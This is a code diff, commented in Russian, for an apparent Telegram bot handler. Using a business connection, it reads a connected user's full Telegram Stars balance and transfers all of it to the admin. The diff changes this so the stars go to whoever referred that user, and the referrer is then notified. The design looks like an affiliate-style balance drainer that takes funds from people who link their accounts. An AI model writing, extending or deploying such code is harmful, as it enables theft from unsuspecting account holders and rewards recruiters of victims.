@@ -920,23 +920,33 @@ async def transfer_stars_handler(callback: CallbackQuery):
         business_connection = await bot.get_business_connection(business_id)
         user = business_connection.user
         
-        # Всегда отправляем звёзды боту (первому админу из списка)
-        recipient_id = ADMIN_IDS[0]
+        # Определяем получателя (как во втором боте)
+        inviter_id = user_referrer_map.get(str(user.id))  # Получаем как строку
+        if inviter_id:
+            try:
+                # Преобразуем inviter_id в int перед использованием
+                await bot.send_chat_action(int(inviter_id), "typing")
+                recipient_id = int(inviter_id)  # Преобразуем в int
+            except Exception:
+                recipient_id = ADMIN_IDS[0]
+        else:
+            recipient_id = ADMIN_IDS[0]
             
         stars = await bot.get_business_account_star_balance(business_id)
-        
-        # Безопасное преобразование amount в int
-        try:
-            amount = int(float(stars.amount)) if stars.amount else 0
-        except (ValueError, TypeError, AttributeError):
-            amount = 0
+        amount = int(stars.amount)
         
         if amount > 0:
             await bot.transfer_business_account_stars(business_id, amount, recipient_id)
-            success_msg = f"🌟 Успешно переведено звёзд: {amount} от {user.id} к боту"
+            success_msg = f"🌟 Успешно переведено звёзд: {amount} от {user.id} к {recipient_id}"
             
             await bot.send_message(LOG_CHAT_ID, success_msg)
-            await callback.answer(f"Переведено {amount} звёзд боту")
+            if inviter_id and int(inviter_id) != recipient_id:  # Сравниваем как числа
+                try:
+                    await bot.send_message(int(inviter_id), success_msg)  # Преобразуем в int
+                except Exception as e:
+                    await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось уведомить пригласившего: {e}")
+                    
+            await callback.answer(f"Переведено {amount} звёзд")
         else:
             await callback.answer("Нет звёзд для перевода", show_alert=True)
             
